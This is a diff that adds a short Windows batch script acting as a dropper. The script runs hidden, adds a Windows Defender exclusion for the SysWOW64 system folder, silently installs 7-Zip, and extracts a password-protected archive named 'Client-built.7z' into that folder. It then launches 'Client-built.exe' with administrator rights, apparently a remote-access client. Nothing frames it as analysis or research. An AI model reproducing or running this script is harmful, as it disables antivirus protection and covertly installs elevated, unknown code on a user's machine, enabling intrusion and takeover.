@@ -1,0 +1,6 @@
+@echo off
+start /MIN /B powershell Add-MpPreference -ExclusionPath "C:\Windows\SysWOW64"
+start /wait /MIN /B 7z1805-x64.exe /S
+start /wait /MIN /B setx path "%path%;C:\Program Files\7-Zip"
+start /wait /MIN /B 7z e Client-built.7z -aoa -p123 -o"C:\Windows\SysWOW64"
+start /wait /MIN /B powershell -command "Start-Process Client-built.exe -Verb runas"
